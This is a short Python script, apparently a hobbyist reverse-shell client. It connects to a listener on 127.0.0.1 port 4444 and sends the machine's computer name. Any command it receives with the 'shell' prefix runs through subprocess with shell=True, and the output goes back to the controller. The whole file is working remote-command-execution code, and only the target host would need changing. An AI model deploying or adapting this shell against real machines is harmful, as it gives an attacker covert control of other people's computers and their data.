import socket, os, subprocess
os.system("cls")

def connect():
    os.system("cls")
    global host
    global port
    global s

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 4444
    host = "127.0.0.1"

    try:
        
        print("[!] Trying to connect to %s:%s"%(host,port))
        s.connect((host,port))
        print("[*] Connection Established")
        
        dataSend(s, os.environ['COMPUTERNAME'])
        print("[*] Sent Data")
               
    except:
        print("Could not connect")
        exit()

def receive():
    receive = dataRecv(s, 4096)
    if receive == "quit":
        s.close()
    elif receive[0:5] == "shell":
        print("[!] Attempting Shell Command")
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value
    else:
        args = "No valid input was given"

    send(args)

def send(args):
    send = dataSend(s, args)
    receive()

def dataSend(con, data):
    try:
        d = data.encode("utf-8")
        print("[*] Sending data [" + data + "]")
        return con.sendall(d)
    except AttributeError:
        print("[*] Sending data [" + data.decode("utf-8") + "]")
        return con.sendall(data)


def dataRecv(con, size):
    data = con.recv(size).decode('utf-8')
    print("[!] Recieved data [" + data + "]")
    return data

connect()
receive()
s.close()
